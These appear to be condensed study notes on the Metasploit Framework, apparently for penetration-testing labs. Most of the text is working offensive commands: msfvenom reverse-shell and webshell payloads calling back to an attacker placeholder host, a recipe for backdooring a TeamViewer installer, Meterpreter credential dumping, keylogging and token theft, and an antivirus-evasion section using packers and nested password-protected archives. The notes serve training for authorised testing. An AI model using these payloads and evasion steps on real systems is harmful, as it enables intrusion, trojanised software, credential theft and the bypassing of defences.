# Metasploit Framework (MSF)

Ruby-based modular pentest platform. Pre-installed Parrot/Kali. MSF6 adds AES-encrypted Meterpreter, SMBv3, polymorphic shellcode.

Base path: `/usr/share/metasploit-framework/`. Modules: `modules/` (auxiliary, encoders, evasion, exploits, nops, payloads, post). Plugins: `plugins/`. Scripts: `scripts/meterpreter`.

Install/update:

```bash
sudo apt update && sudo apt install metasploit-framework
```

---

## msfconsole

```bash
msfconsole          # launch with banner
msfconsole -q       # quiet (no banner)
msfconsole -m /usr/share/metasploit-framework/modules/   # load custom module path
```

Key commands:

```
help                # all commands
search <term>       # search modules
use <no. or path>   # select module
info                # module details, CVEs, authors
show options        # required/optional params
show targets        # OS/version targets for current exploit
show payloads       # compatible payloads for current exploit
show encoders       # compatible encoders
set <OPT> <val>     # set option (session-scope)
setg <OPT> <val>    # set globally (persists until restart)
unset <OPT>         # clear option
run / exploit       # execute module
exploit -j          # run as background job
back                # deselect module
grep <str> <cmd>    # filter output
grep -c <str> <cmd> # count matches
```

---

## Module Syntax & Search

Format: `<No.> <type>/<os>/<service>/<name>`

Module types: `auxiliary` (scan/fuzz/sniff/admin), `encoders`, `evasion`, `exploits`, `nops`, `payloads`, `post`.

Only interactable types (can be selected with `use`): auxiliary, exploits, post.

Search keywords:

```
search eternalromance
search type:exploit platform:windows cve:2021 rank:excellent microsoft
search cve:2017 type:exploit platform:windows
search ms17_010
search -s rank       # sort by rank ascending
search -s rank -r    # sort descending
```

Search fields: `cve:`, `type:`, `platform:`, `rank:`, `author:`, `arch:`, `port:`, `name:`, `edb:`, `bid:`.

---

## Targets

```
show targets                         # list compatible OS/version targets
set target <Id>                      # select specific target
```

`Automatic` = MSF performs detection. Set specific target if known (faster, more reliable). Target ID determines return address used — different SP/language packs shift addresses.

---

## Payloads

Three types: **Singles** (inline, self-contained, no stage — `/`-less name), **Stagers** (small, initiates connection, pulls down Stage), **Stages** (feature-rich payload delivered by Stager — Meterpreter, VNC, shell).

Slash in name = staged: `windows/shell/bind_tcp` (stager + stage). No slash = single: `windows/shell_bind_tcp`.

Reverse = target calls back to attacker (bypasses inbound firewall rules). Bind = attacker connects to target listener.

```
show payloads                              # all payloads (auto-filtered to compatible)
grep meterpreter show payloads             # filter for meterpreter
grep meterpreter grep reverse_tcp show payloads   # chain grep
set payload <no. or path>                  # select payload
```

Common payload types:

|Payload|Notes|
|---|---|
|`windows/x64/meterpreter/reverse_tcp`|Staged, AES-encrypted, in-memory|
|`windows/x64/meterpreter_reverse_tcp`|Stageless (inline) version|
|`windows/x64/shell_reverse_tcp`|Single, raw cmd shell|
|`windows/x64/shell/reverse_tcp`|Staged raw shell|
|`generic/shell_reverse_tcp`|Multi-use, any OS|

Key payload options: `LHOST` (attacker IP — set to tun0 on HTB), `LPORT` (default 4444), `EXITFUNC`.

---

## Encoders

Purpose: adapt payload to architecture, remove bad chars (`-b "\x00"`). AV evasion via encoding is largely ineffective against modern AV — use for bad-char removal primarily.

Notable: `x86/shikata_ga_nai` (SGN) — polymorphic XOR, previously excellent, now widely detected. `-i <N>` = iterations.

```
show encoders           # compatible encoders for current module+payload
```

---

## msfvenom

Combines msfpayload + msfencode. Standalone payload generator.

```bash
# Basic staged payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=4444 -f exe -o shell.exe

# With encoder
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe

# Remove bad chars
msfvenom -p windows/shell/reverse_tcp LHOST=<LHOST> LPORT=4444 -b "\x00" -f perl

# PHP webshell
msfvenom -p php/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=4444 -f raw -o shell.php

# ASPX shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=4444 -f aspx -o shell.aspx

# Backdoor into existing exe (keeps original functionality with -k)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=4444 -k -x TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -i 5 -o TeamViewerInstall.exe

# JS payload
msfvenom -p windows/x86/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o test.js -i 5
```

Key flags: `-p` payload, `-a` arch, `--platform`, `-f` format, `-o` output, `-e` encoder, `-i` iterations, `-b` bad chars, `-k` keep original execution, `-x` template exe. Formats: `exe`, `elf`, `raw`, `perl`, `ruby`, `c`, `asp`, `aspx`, `war`, `dll`.

Check VirusTotal from CLI:

```bash
msf-virustotal -k <API_KEY> -f <FILE>
```

---

## Database (PostgreSQL)

Tracks hosts, services, vulns, creds, loot per workspace. Import Nmap XML, use `db_nmap` directly, or add manually.

```bash
sudo systemctl start postgresql
sudo msfdb init
sudo msfdb run          # start MSF + connect DB
# OR
msfconsole -q
msf6 > db_status
```

Workspace management:

```
workspace                   # list workspaces (* = active)
workspace -a <name>         # create + switch
workspace <name>            # switch
workspace -d <name>         # delete
workspace -r <old> <new>    # rename
workspace -D                # delete all
```

Database commands:

```
db_nmap -sV -sS <TARGET>         # nmap + auto-store results
db_import Target.xml             # import nmap XML
db_export -f xml backup.xml      # export all data

hosts                            # list all hosts
hosts -R                         # set RHOSTS from hosts table
hosts -c address,os_name         # show specific columns

services                         # list all services
services -p 445                  # filter by port
services -s smb                  # filter by service name
services -R                      # set RHOSTS from services

creds                            # list captured credentials
creds add user:admin password:pass ntlm:<HASH>

loot                             # list hash dumps, passwd files, etc.
```

---

## Sessions & Jobs

```
sessions              # list active sessions
sessions -i <Id>      # interact with session
sessions -k <Id>      # kill session
sessions -K           # kill all
[CTRL+Z] or background # background active session
bg                    # alias in Meterpreter

jobs -l               # list running jobs
jobs -k <Id>          # kill job
jobs -K               # kill all
exploit -j            # run exploit as background job
```

Post-exploitation workflow: background session → search post module → `set SESSION <Id>` → run.

---

## Meterpreter

DLL-injected, in-memory, AES-encrypted (MSF6), no disk traces. Loads via Reflective DLL injection. All comms AES-encrypted. Migrates between processes.

Key commands:

```
getuid                      # current user
getpid                      # current PID
sysinfo                     # OS/hostname info
ps                          # process list
migrate <PID>               # migrate to process
steal_token <PID>           # impersonate process token
shell                       # drop to OS shell (creates channel)
execute -f cmd.exe -i       # spawn interactive process
getsystem                   # attempt local privesc

# File system
ls / dir / cd / pwd / cat / upload / download / search
mkdir / rm / edit

# Networking
ifconfig / ipconfig / arp / netstat / portfwd

# Post-exploitation
hashdump                    # dump SAM hashes (needs SYSTEM)
lsa_dump_sam                # SAM dump (needs SYSTEM)
lsa_dump_secrets            # LSA secrets
keyscan_start / keyscan_dump / keyscan_stop
screenshot
run post/multi/recon/local_exploit_suggester   # local privesc suggestions

# Session management
background / bg
sessions -i <Id>
load kiwi                   # load Mimikatz successor
run <post module>           # run post module in current session
resource <file.rc>          # run resource script
```

`channel` = communication stream. `shell` opens cmd in new channel. `CTRL+Z` backgrounds Meterpreter, not channel.

Meterpreter startup sequence: target runs stager → stager loads Reflective DLL → core initializes AES session → GET to attacker → stdapi + priv loaded over AES.

---

## Plugins

Load from `/usr/share/metasploit-framework/plugins/`. Must be `.rb` file.

```
load nessus              # load plugin
load pentest             # DarkOperator's pentest plugin
loadpath /path/to/modules/   # load custom module path
reload_all               # reload all modules (after installing new ones)
```

Install custom plugin:

```bash
git clone https://github.com/darkoperator/Metasploit-Plugins
sudo cp Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
```

Old Mimikatz extension → replaced by Kiwi (`load kiwi`).

---

## Writing / Importing Modules

Install from ExploitDB `.rb` file:

```bash
# Find with searchsploit
searchsploit nagios3
searchsploit -t Nagios3 --exclude=".py"    # only .rb files

# Copy to correct path (use snake_case filenames)
cp 9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb

msfconsole -q
msf6 > reload_all
msf6 > use exploit/unix/webapp/nagios3_command_injection
```

Module naming convention: snake_case, alphanumeric + underscores only (no dashes). Wrong naming = module not found.

Module directory structure matches: `modules/<type>/<platform>/<service>/<name>.rb`.

---

## Multi/Handler (Catching Shells)

```
use multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
exploit -j            # run as background job to catch multiple sessions
```

---

## Evasion

Modern AV = heuristic + ML + deep packet inspection. SGN encoding alone insufficient — 50+ detections typical.

Techniques:

- `-k -x <legit.exe>` — embed payload in legitimate exe, keep original execution flow
- Multiple encoding iterations (`-i 10`) — limited improvement
- Password-protected archives (double-archive, remove extension) — 0/49 detections example
- Packers (UPX, Enigma, Themida) — compress + encrypt executable structure
- MSF6 AES-encrypted Meterpreter — bypasses network IDS signatures
- Polymorphic shellcode (MSF6 default) — shuffles stub instructions each generation

Archive evasion:

```bash
rar a test.rar -p test.js   # password-protect
mv test.rar test             # remove extension
rar a test2.rar -p test      # archive again with password
mv test2.rar test2           # remove extension → 0 detections
```

Endpoint = software AV on host. Perimeter = hardware/virtual firewall/IDS at network edge. DMZ = between public internet and internal network.

Detection types: Signature-based, Heuristic/Statistical Anomaly, Stateful Protocol Analysis, SOC live monitoring.

> [!warning] msfvenom default payloads detected by 50+ AV engines. Never use unmodified defaults against hardened targets. Use template exe + archiving + custom stagers for actual evasion.

> [!tip] `local_exploit_suggester` (`post/multi/recon/local_exploit_suggester`) is the fastest path to privesc suggestions after initial foothold. Background session → set SESSION → run. Always check after landing as low-priv user.